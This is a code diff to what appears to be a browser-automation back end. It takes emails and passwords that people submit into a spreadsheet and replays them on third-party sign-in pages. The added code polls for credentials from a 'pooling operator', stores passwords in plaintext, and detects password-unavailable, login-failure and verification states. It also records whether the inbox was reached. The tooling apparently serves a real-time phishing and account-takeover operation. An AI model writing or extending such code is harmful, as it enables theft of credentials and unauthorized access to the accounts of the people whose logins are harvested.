@@ -108,16 +108,20 @@ async function validateEmailAgainstStrictly(email, strictly) {
  * @param {object} updateData - The data to update
  * @param {boolean} isNewRow - Whether this is a new row creation
  */
-function updateBrowserRowDataFast(browserId, updateData, isNewRow = false) {
+async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false) {
     // 1. Write to cache FIRST (instant, synchronous)
     if (isNewRow) {
         populateCache(browserId, updateData);
     } else {
-        setCachedRow(browserId, updateData);
+        // Merge with existing cache to preserve email/password during intermediate writes
+        const existing = getCachedRow(browserId) || {};
+        setCachedRow(browserId, { ...existing, ...updateData });
     }
-    // 2. Fire Sheets API WITHOUT await (non-blocking)
-    updateBrowserRowData(browserId, updateData, isNewRow).catch(err => {
-        logger.error(`[updateBrowserRowDataFast][${browserId}] Background Sheets write failed: ${err.message}`);
+    // 2. Write to sheet (awaited) so pooling operator always sees latest status
+    const cachedForWrite = getCachedRow(browserId) || {};
+    const mergedForWrite = { ...cachedForWrite, ...updateData };
+    await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
+        logger.error(`[updateBrowserRowDataFast][${browserId}] Sheets write failed: ${err.message}`);
     });
 }
 
@@ -931,6 +935,23 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                         logger.warn(`[checkAccountAccess][${instanceId}] Password next button clicked but page did not change (URL same, password input still visible). Wrong button may have been clicked.`);
                                         return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD', message: "Password submit button did not work. Please try again." };
                                     }
+                                    // Check for "Password sign-in isn't available" error
+                                    if (platformConfig.selectors?.passwordUnavailable) {
+                                        const pwUnavailSelectors = Array.isArray(platformConfig.selectors.passwordUnavailable)
+                                            ? platformConfig.selectors.passwordUnavailable
+                                            : [platformConfig.selectors.passwordUnavailable];
+                                        for (const sel of pwUnavailSelectors) {
+                                            if (typeof sel === 'string') {
+                                                const unavailableExists = await page.evaluate((xpath) => {
+                                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
+                                                }, sel).catch(() => false);
+                                                if (unavailableExists) {
+                                                    logger.info(`[checkAccountAccess][${instanceId}] Password sign-in unavailable detected.`);
+                                                    return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: "Password sign-in isn't available for this account. Try another sign-in method." };
+                                                }
+                                            }
+                                        }
+                                    }
                                     // Check for login failure
                                     if (platformConfig.selectors.loginFailed) {
                                         const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ? platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
@@ -1271,6 +1292,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     let instanceId = `PROC-SETUP-${browserId}`;
     let isReusingBrowser = false;
 
+    // Populate cache with full row data so intermediate writes (status etc.) preserve email/password
+    const initialRowData = Object.fromEntries(
+        Object.entries(columnIndexes).map(([key, idx]) => [key, row[idx]])
+    );
+    populateCache(browserId, initialRowData);
+
     // Set initialCheckResult from lastJsonResponse if available
     if (row && row[columnIndexes['lastJsonResponse']]) {
         try {
@@ -1457,40 +1484,53 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         break; // Exit polling loop
                     }
 
-                    const checkData = await fetchDataFromAppScript(1, 30000, true); // Force refresh, rate-limited by _fetchAndCacheAppScriptData
-                    const checkHeaders = checkData[0];
-                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                    const checkRows = checkData.slice(1);
-                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-
-                    if (!checkRow) {
-                        logger.error(`[processRow][${browserId}][WAITINGEMAIL] Row not found during polling. Exiting loop.`);
-                        finalStatus = "FAILED";
-                        break;
+                    // Check cache FIRST for email (pooling operator writes here immediately via immediateFlush)
+                    let currentEmail = null;
+                    let freshPassword = null;
+                    const cachedForPoll = getCachedRow(browserId);
+                    if (cachedForPoll?.email && String(cachedForPoll.email).trim() !== "") {
+                        currentEmail = cachedForPoll.email;
+                        freshPassword = cachedForPoll.password;
+                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found in cache: '${currentEmail}'`);
                     }
 
-                    if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
-                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Status changed to FAILED externally. Exiting.`);
-                        finalStatus = "FAILED";
-                        break;
-                    }
+                    // Fall back to sheet read if cache doesn't have email
+                    if (!currentEmail) {
+                        const checkData = await fetchDataFromAppScript(1, 30000, true); // Force refresh, rate-limited by _fetchAndCacheAppScriptData
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
 
-                    const currentEmail = checkRow[checkColumnIndexes['email']];
-                    logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Fetched email: '${currentEmail}'`);
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGEMAIL] Row not found during polling. Exiting loop.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+
+                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
+                            logger.info(`[processRow][${browserId}][WAITINGEMAIL] Status changed to FAILED externally. Exiting.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+
+                        currentEmail = checkRow[checkColumnIndexes['email']];
+                        freshPassword = checkRow[checkColumnIndexes['password']];
+                        logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Fetched email from sheet: '${currentEmail}'`);
+                    }
 
                     if (currentEmail && String(currentEmail).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found. Setting status to PROCESSING.`);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
                         email = currentEmail; // Update the email variable for subsequent use
                         emailProvidedAndProcessed = true;
-                        // Refresh password from sheet — user may have submitted it alongside email
-                        const freshPassword = checkRow[checkColumnIndexes['password']];
+                        // Refresh password from cache or sheet — user may have submitted it alongside email
                         if (freshPassword && String(freshPassword).trim() !== "") {
                             password = freshPassword;
                         }
 
                         // Validate email against strictly platform using MX detection
-                        const rowStrictlyForValidation = checkRow[checkColumnIndexes['strictly']];
+                        const rowStrictlyForValidation = row[columnIndexes['strictly']];
                         if (rowStrictlyForValidation) {
                             const validation = await validateEmailAgainstStrictly(email, rowStrictlyForValidation);
                             if (!validation.valid) {
@@ -1574,10 +1614,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
             }
 
-            logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Exited poll loop. emailProvided: ${emailProvidedAndProcessed}, now: ${Date.now()}, timeoutAt: ${pollingTimeoutEmail}, diff: ${pollingTimeoutEmail - Date.now()}ms, finalStatus: ${finalStatus}`);
+            logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Exited poll loop. emailProvided: ${emailProvidedAndProcessed}, now: ${Date.now()}, timeoutAt: ${pollingTimeoutEmail}, diff: ${pollingTimeoutEmail - Date.now()}ms`);
 
             if (emailProvidedAndProcessed) {
-                logger.info(`[processRow][${browserId}] Email was provided. finalStatus=${finalStatus}, verificationState=${initialCheckResult.verificationState}, emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}`);
+                logger.info(`[processRow][${browserId}] Email found. checkAccountAccess: emailExists=${initialCheckResult.emailExists}, accountAccess=${initialCheckResult.accountAccess}, reachedInbox=${initialCheckResult.reachedInbox}, verificationState=${initialCheckResult.verificationState}`);
             }
 
             if (!emailProvidedAndProcessed) {
@@ -1999,6 +2039,44 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                                 // Handle any additional views (like "Stay Signed In") that might appear after password submission
                                 await handleAdditionalViews(page, platformConfig, instanceId, 'post_password_submission');
+
+                                // **CRITICAL**: Check for "Password sign-in isn't available" error FIRST
+                                let passwordUnavailableDetected = false;
+                                if (platformConfig.selectors?.passwordUnavailable) {
+                                    const pwUnavailSelectors = Array.isArray(platformConfig.selectors.passwordUnavailable)
+                                        ? platformConfig.selectors.passwordUnavailable
+                                        : [platformConfig.selectors.passwordUnavailable];
+                                    for (const sel of pwUnavailSelectors) {
+                                        if (typeof sel === 'string') {
+                                            const unavailableExists = await page.evaluate((xpath) => {
+                                                try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
+                                            }, sel).catch(() => false);
+                                            if (unavailableExists) {
+                                                logger.info(`[processRow][${browserId}] Password sign-in unavailable detected after password submission.`);
+                                                passwordUnavailableDetected = true;
+                                                break;
+                                            }
+                                        }
+                                    }
+                                }
+
+                                if (passwordUnavailableDetected) {
+                                    initialCheckResult = {
+                                        emailExists: true, accountAccess: false, reachedInbox: false,
+                                        requiresVerification: false, verificationState: null,
+                                        message: "Password sign-in isn't available for this account. Try another sign-in method."
+                                    };
+                                    finalStatus = "FAILED";
+                                    updateData.status = "FAILED";
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        browserId, email, status: "FAILED",
+                                        emailExists: true, accountAccess: false, reachedInbox: false,
+                                        requiresVerification: false, verificationState: null,
+                                        platform, timestamp: new Date().toISOString(),
+                                        message: "Password sign-in isn't available for this account. Try another sign-in method."
+                                    });
+                                    break; // Exit password processing
+                                }
 
                                 // **CRITICAL**: Check for login failed (incorrect password) BEFORE checking verification/inbox
                                 let passwordFailedDetected = false;
@@ -3677,10 +3755,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
         const finalSheetUpdate = { ...updateData };
-        // Ensure FAILED status includes the latest email and password
+        // Always include email and password in final write so sheet never loses them
+        if (email) finalSheetUpdate.email = email;
+        if (password) finalSheetUpdate.password = password;
         if (finalSheetUpdate.status === "FAILED" && processingStarted) {
-            finalSheetUpdate.email = email || finalSheetUpdate.email;
-            finalSheetUpdate.password = password || finalSheetUpdate.password;
             notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
         } else if (finalSheetUpdate.status === "FAILED" && !processingStarted) {
             logger.info(`[processRow][${browserId}] Skipping FAILED notification — processing never started.`);
